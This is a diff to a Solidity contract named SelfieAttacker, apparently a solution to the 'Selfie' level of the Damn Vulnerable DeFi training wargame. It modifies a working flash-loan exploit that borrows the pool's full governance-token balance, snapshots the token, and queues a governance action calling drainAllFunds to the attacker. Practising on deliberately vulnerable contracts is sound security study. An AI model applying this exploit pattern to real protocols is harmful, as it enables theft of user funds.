@@ -24,10 +24,12 @@ contract SelfieAttacker{
 
     function attack() external{
         uint256 amount = governanceToken.balanceOf(address(selfiePool));
-        selfiePool.flashLoan(10);
+        selfiePool.flashLoan(amount);
     }
 
     function receiveTokens(address token,uint256 amount) external{
+        DamnValuableTokenSnapshot tokensnap = DamnValuableTokenSnapshot(token);
+        tokensnap.snapshot();
         
         proposalId = simpleGovernance.queueAction(address(selfiePool), 
         abi.encodeWithSignature("drainAllFunds(address)", attacker), 0);
